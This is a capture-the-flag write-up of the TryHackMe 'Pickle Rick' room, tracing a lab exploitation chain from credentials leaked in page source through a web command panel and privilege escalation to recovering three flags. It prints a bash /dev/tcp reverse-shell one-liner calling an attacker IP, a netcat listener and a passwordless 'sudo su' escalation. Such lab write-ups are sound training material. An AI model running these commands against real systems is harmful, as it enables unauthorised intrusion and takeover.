
# 🥒 Pickle Rick — Web Exploitation Case Report

TryHackMe Walkthrough • Web Shell • Privilege Escalation

## 🧭 Overview

This report documents the full exploitation of the **Pickle Rick** room on TryHackMe.
The challenge involves discovering leaked credentials, abusing a command‑execution panel, gaining a reverse shell, escalating privileges, and extracting **three hidden ingredients** required to help Rick become human again.

Techniques used:

* Source‑code analysis
* File enumeration
* Command execution → reverse shell
* Privilege escalation through misconfigured sudo
* Flag retrieval from system files

---

## 🏷️ Case Summary

| Field                | Details                                          |
| -------------------- | ------------------------------------------------ |
| Room Name            | Pickle Rick                                      |
| Target URL           | `http://10.65.165.69/login.php`                  |
| Goal                 | Retrieve all 3 secret ingredients                |
| Attack Surface       | Hard‑coded credentials + command execution panel |
| Privilege Escalation | Insecure sudo configuration                      |

---

# 🐾 Task 1 — Credentials Discovery

**Goal:** Identify the username and password for the login panel.

### 🔍 Evidence — Username

Inspecting the page source of `login.php`:

```
Right‑click → View Page Source
```

An HTML comment reveals the username:

```html
<!-- Username: R1ckRul3s -->
```

### 🔍 Evidence — Password

After initial commands (using the built‑in “Execute” panel), I found a readable file containing the password:

```bash
cat /root.txt
```

Content:

```
Wubbalubbadubdub
```

### 🎯 Findings

| Credential | Value                |
| ---------- | -------------------- |
| Username   | **R1ckRul3s**        |
| Password   | **Wubbalubbadubdub** |

These credentials grant access to:
`http://10.65.165.69/login.php`

---

# 🐾 Task 2 — Initial Foothold (Command Execution)

**Goal:** Interact with the server through the web shell.

The authenticated page exposes a command execution feature.
Simple commands were tested:

```bash
ls
whoami
pwd
```

The server executes commands with the current user’s permissions, giving full directory visibility.

---

# 🐾 Task 3 — Reverse Shell

**Goal:** Upgrade from web‑command execution to an interactive shell.

### Payload sent via web panel:

```bash
bash -c 'bash -i >& /dev/tcp/192.168.174.107/4444 0>&1'
```

### Listener on attacker machine:

```bash
nc -lvnp 4444
```

**Result:** Full reverse shell established.

---

# 🐾 Task 4 — Ingredient #1

**Goal:** Locate the first secret ingredient.

Searching user’s home directory:

```bash
ls -la
cat Sup3rS3cretPickl3Ingred.txt
```

**Ingredient #1 retrieved.**

---

# 🐾 Task 5 — Ingredient #2

**Goal:** Find the second ingredient somewhere on the filesystem.

Searching from `/`:

```bash
find / -type f -name "*ingredient*" 2>/dev/null
```

File found, then extracted:

```bash
cat "second ingredients"
```

**Ingredient #2 retrieved.**

---

# 🐾 Task 6 — Privilege Escalation to Root

**Goal:** Escalate privileges and access the final ingredient.

Testing sudo privileges:

```bash
sudo -l
```

Result: The current user can run `sudo` **without a password**.

Escalate:

```bash
sudo su
```

Navigate to root directory:

```bash
cd /
cat 3rd.txt
```

**Ingredient #3 retrieved.**

---

# 🧩 Final Conclusion

The Pickle Rick machine demonstrates weak security practices that lead to complete compromise:

✔ Leaked username in HTML source
✔ Password exposed in system file
✔ Command execution via web panel
✔ Reverse shell with no restrictions
✔ Root privileges granted without a password
✔ All 3 ingredients successfully recovered

This completes the challenge and provides a full exploitation chain from initial access to privilege escalation.
